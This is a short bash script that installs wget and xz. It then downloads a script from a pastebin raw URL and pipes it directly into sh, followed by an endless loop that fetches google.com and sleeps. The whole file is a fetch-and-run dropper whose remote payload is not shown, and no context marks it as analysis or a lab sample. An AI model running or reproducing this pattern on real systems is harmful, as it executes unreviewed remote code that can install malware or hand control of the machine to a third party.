#!/bin/bash

yum install wget
yum install xz -y

(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh && while true ; do wget google.com ; sleep 999999 ; done
